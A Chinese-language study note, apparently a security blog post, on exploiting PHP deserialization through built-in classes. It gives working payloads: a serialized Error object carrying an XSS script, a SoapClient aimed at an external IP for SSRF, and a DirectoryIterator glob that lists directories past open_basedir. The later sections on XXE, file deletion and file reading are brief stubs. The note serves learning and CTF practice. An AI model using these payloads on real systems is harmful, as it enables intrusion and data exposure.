---
title: "PHP反序列化-利用原生类"
date: 2025-05-29
tags:
  - Others
categories:
  - Others
---
> 原生自带类导致的 PHP 反序列化漏洞：
> 
> https://xz.aliyun.com/news/8792
> 
> https://www.anquanke.com/post/id/264823
> 
> https://blog.csdn.net/cjdgg/article/details/115314651
> 
> https://drun1baby.top/2023/04/11/PHP-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/

### Error/Exception 进行 XSS

Error 适用 PHP 7；Exception 适用 PHP 5 和 7 版本；

Error/Exception 内置一个`__toString()`方法。

示例：

```php
<?php
highlight_file(__file__);
$a = unserialize($_GET['code']);
echo $a;
?>
```

该示例代码中仅有一个反序列化函数，但是没有其对应的类相关的内容；此时需要寻找关于 PHP 原生类来触发反序列化所产生的漏洞问题。

主要是由于其中`echo $a`将反序列化后的对象作为一个字符串进行输出，从而触发`__toString`方法；

```php
<?php
$a = new Error("<script>alert('xss')</script>");
$b = serialize($a);
echo urlencode($b);  
?>
```

得到的内容传入示例中的 code 参数即可触发 XSS 漏洞；

### ScoapClient 进行 SSRF

SoapClient 是专门用来访问 web 服务的类，提供一个基于 SOAP 协议访问 Web 服务的 PHP 客户端。其内置有一个 `__call()` 方法，可被利用；

```txt
public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
// 第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。
// 第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。
```

构造 Payload，第一个参数设为 null ，第二个参数的 location 选项设置为 target_url 。（第二个参数还可以设置多个 HTTP 请求头参数）

```php
<?php
$a = new SoapClient(null,array('location'=>'http://xxx.xxx.xxx.72:2333/aaa', 'uri'=>'http://xxx.xxx.xxx.72:2333'));
$b = serialize($a);
echo $b;
$c = unserialize($b);
$c->a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf
?>
```

### 可遍历目录类绕过 open_basedir

可以遍历目录类：DirectoryIterator、FilesystemIterator、GlobIterator ；

DirectoryIterator 提供一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录迭代器。

当执行到 echo 函数时，会触发 DirectoryIterator 类中的 `__toString()` 方法，输出指定目录里面经过排序之后的第一个文件名。

```php
// test.php
<?php
$dir = $_GET['whoami'];
$a = new DirectoryIterator($dir);
foreach($a as $f){
    echo($f->__toString().'<br>');
}
?>

# payload一句话的形式:
$a = new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().'<br>');}
```

输入 `/?whoami=glob:///*` 即可列出根目录下的文件。

### SimpleXMLElement 进行 XXE

该类用于解析 XML 文档中的元素。

通过设置第三个参数 data_is_url 为 true ，可实现远程 xml 文件载入；第二个参数常量值；第一个参数 data 为自己设置的 Payload 的 url 地址，用于引入的外部实体的 url 。

### ZipArchive 删除文件

PHP 5.2.0；

该类可对文件进行压缩与解压缩处理；

### SqlFileObject 读取文件内容

SplFileObject 类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作等。

> 关于原生类可查看官方文档来理解： https://www.php.net/manual/zh/index.php

### 反射类 Reflection
